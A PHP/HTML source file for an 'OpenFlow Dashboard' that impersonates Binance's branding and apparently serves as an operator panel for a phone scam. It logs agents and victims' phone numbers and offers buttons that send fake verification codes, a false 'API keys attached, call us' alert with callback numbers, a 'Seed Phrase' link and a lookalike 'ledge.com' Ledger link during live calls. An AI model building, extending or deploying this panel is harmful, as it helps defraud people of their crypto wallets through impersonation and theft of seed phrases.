<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
date_default_timezone_set('Europe/London');
//exit("Hello World");
$agent  = $_GET['agent']  ?? 'Unknown';
$caller = $_GET['caller'] ?? 'Unknown';

$conn = mysqli_connect('localhost', 'root', '', 'fromzero_morevitility');
if ($conn && $agent !== 'Unknown') {
    $eAgent = mysqli_real_escape_string($conn, $agent);
    $sql = "SELECT role FROM ausers WHERE user = '$eAgent' LIMIT 1";
    $result = mysqli_query($conn, $sql);
    if ($row = mysqli_fetch_assoc($result)) {
        $role = strtolower($row['role']);
    }
    //mysqli_close($conn);
}

$insernewdata = insertdata($conn, $agent, $caller);
mysqli_close($conn);

function insertdata($conn, $agent, $caller)
{
    $eAgent  = mysqli_real_escape_string($conn, $agent);
    $eCaller = mysqli_real_escape_string($conn, $caller);
    $eAction = 'verify';

    $aCaller = '61' . substr(substr($eCaller, 3), 0, -1); // 0 + drop first 3 + drop last
    $adminCaller = mysqli_real_escape_string($conn, $aCaller);
    $todattime = date('Y-m-d H:i:s');
    $sqlAdmin = "
      INSERT INTO adminsmsdata (agent, number, butclick, insertdate)
      VALUES ('$eAgent', '$adminCaller', '$eAction','$todattime')
    ";
    $okAdmin = mysqli_query($conn, $sqlAdmin);

    if (!$okAdmin) {

        file_put_contents(date('Y-m-d') . "_newdata_adminsqlerror", date('H:i:s') . " _" . mysqli_error($conn) . PHP_EOL, FILE_APPEND);
    }
    $sqlOwner = "
      INSERT INTO ownersmsdata (agent, number, butclick, insertdate)
      VALUES ('$eAgent', '$adminCaller', '$eAction','$todattime')
    ";
    $okOwner = mysqli_query($conn, $sqlOwner);

    if (!$okOwner) {

        file_put_contents(date('Y-m-d') . "newdata_adminsqlerror", date('H:i:s') . " _" . mysqli_error($conn) . PHP_EOL, FILE_APPEND);
    }
}
?>
<!DOCTYPE html>
<html lang="en" class="dark">

<head>
    <meta charset="UTF-8">
    <title>OpenFlow Dashboard</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            darkMode: 'class',
            theme: {
                extend: {
                    colors: {
                        'binance-brand-gold': '#fcd535',
                        'binance-bg-dark': '#181a20',
                    }
                }
            }
        };
    </script>
</head>

<body class="dark:bg-binance-bg-dark bg-white text-white font-sans min-h-screen">

    <header class="border-b border-gray-100 dark:border-gray-800 px-4 py-4">
        <div class=" flex justify-between items-center">
            <div class="flex items-center space-x-2"><a href="/"><img src="./assets/images/Binance_logo.svg" class="w-[120px] h-[24px]" alt="logo"></a></div>
            <button id="themeToggle" class="p-2 rounded-lg text-white hover:text-binance-brand-gold transition-colors duration-200" aria-label="Toggle theme">
                <svg id="moonIcon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" class=" hidden text-[24px] text-white h-6 hover:text-[#F0B90B]">
                    <path fill-rule="evenodd" clip-rule="evenodd" d="M10.5 2h3v3h-3V2zM16 12a4 4 0 11-8 0 4 4 0 018 0zM5.99 3.869L3.867 5.99 5.99 8.112 8.111 5.99 5.989 3.87zM2 13.5v-3h3v3H2zm1.868 4.51l2.121 2.12 2.122-2.12-2.122-2.122-2.121 2.121zM13.5 19v3h-3v-3h3zm4.51-3.112l-2.121 2.122 2.121 2.121 2.121-2.121-2.121-2.122zM19 10.5h3v3h-3v-3zm-3.11-4.51l2.12 2.121 2.122-2.121-2.121-2.121-2.122 2.121z" fill="currentColor"></path>
                </svg>
                <svg id="sunIcon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" class="text-[24px] text-black h-6 hover:text-[#F0B90B]">
                    <path d="M20.968 12.768a7 7 0 01-9.735-9.735 9 9 0 109.735 9.735z" fill="currentColor"></path>
                </svg>
            </button>
        </div>
    </header>
    <div class="px-4 mt-3 mb-4">
        <h1 class="md:text-4xl text-lg font-bold text-[#232323] dark:text-white">OpenFlow Dashboard</h1>
        <p class="md:text-xl mt-2 text-[#949597]">Manage verification and triggers customer communication during active calls.</p>
    </div>

    <!-- Main Container -->
    <div class="flex block justify-center md:px-4 px-2 py-4">
        <div class="md:max-w-md  relative">

            <!-- Reference Input -->
            <div class="flex items-center space-x-2 mb-8">
                <input type="text" placeholder="Enter Reference" class="flex-1 dark:border-gray-200 dark:border-0 dark:inset-shadow-xs border px-4 py-4 text-black rounded">
                <button class="bg-[#659c36] px-4 py-[14px] rounded text-white text-xl font-bold">
                    <span>
                        <svg fill="#ffffff" class="w-7" viewBox="0 0 1920 1920" xmlns="http://www.w3.org/2000/svg" stroke="#ffffff">
                            <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
                            <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g>
                            <g id="SVGRepo_iconCarrier">
                                <path d="M1827.701 303.065 698.835 1431.801 92.299 825.266 0 917.564 698.835 1616.4 1919.869 395.234z" fill-rule="evenodd"></path>
                            </g>
                        </svg>
                    </span>
                </button>
            </div>

            <!-- Buttons and Info Boxes -->
            <div class="space-y-8">
                <!-- Verify -->
                <div class="mb-8">
                    <button class="text-binance-bg-dark font-semibold bg-binance-brand-gold rounded-[8px] w-[-webkit-fill-available] h-12 text-base py-1.5 px-3 min-w-[48px] hover:opacity-[0.8] hover:bg-binance-brand-gold">Verify</button>
                    <div class="bg-[#232323] text-white text-sm mt-3 p-3 rounded">
                        <strong>Example:</strong><br>
                        Your verification code is <strong>876-872</strong><br>
                        Never share this code with anyone. Only a genuine advisor will confirm it to you.
                    </div>
                </div>

                <!-- API Key -->
                <div class="mb-8">
                    <button class="text-binance-bg-dark font-semibold bg-binance-brand-gold rounded-[8px] w-[-webkit-fill-available] h-12 text-base py-1.5 px-3 min-w-[48px] hover:opacity-[0.8] hover:bg-binance-brand-gold">API Key</button>
                    <div class="bg-[#232323] text-white text-sm mt-3 p-3 rounded">
                        <strong>Example:</strong><br>
                        API Keys for an external wallet was successfully attached to your account. If this was not initiated by you call us immediately on <br>
                        +61 1800576977 or +61 26105933
                    </div>
                </div>

                <!-- API key cancel -->
                <div class="mb-8">
                    <button class="text-binance-bg-dark font-semibold bg-binance-brand-gold rounded-[8px] w-[-webkit-fill-available] h-12 text-base py-1.5 px-3 min-w-[48px] hover:opacity-[0.8] hover:bg-binance-brand-gold">API Key Cancel</button>
                    <div class="bg-[#232323] text-white text-sm mt-3 p-3 rounded">
                        <strong>Example:</strong><br>
                        External wallet API connection cancelled. The API keys have been removed from your account and access revoked.
                    </div>
                </div>

                <!-- Seed Phrase -->
                <div class="mb-8">
                    <button class="text-binance-bg-dark font-semibold bg-binance-brand-gold rounded-[8px] w-[-webkit-fill-available] h-12 text-base py-1.5 px-3 min-w-[48px] hover:opacity-[0.8] hover:bg-binance-brand-gold">Seed Phrase</button>
                    <div class="bg-[#232323] text-white text-sm mt-3 p-3 rounded">
                        <strong>Example:</strong><br>
                        seed.com/ref123
                    </div>
                </div>

                <!-- Ledger -->
                <div class="mb-8">
                    <button class="text-binance-bg-dark font-semibold bg-binance-brand-gold rounded-[8px] w-[-webkit-fill-available] h-12 text-base py-1.5 px-3 min-w-[48px] hover:opacity-[0.8] hover:bg-binance-brand-gold">Ledger</button>
                    <div class="bg-[#232323] text-white text-sm mt-3 p-3 rounded">
                        <strong>Example:</strong><br>
                        ledge.com
                    </div>
                </div>

                <!-- Block -->
                <div>
                    <button class="text-white font-semibold bg-red-500 rounded-[8px] w-[-webkit-fill-available] h-12 text-base py-1.5 px-3 min-w-[48px] hover:opacity-[0.8] hover:bg-red-500">Block</button>
                </div>
            </div>

            <!-- Footer -->
            <div class="mt-6 text-center text-gray-400 text-xs">
                Binance © 2025
            </div>
        </div>
    </div>

    <script src="./assets/js/theme.js"></script>

</body>

</html>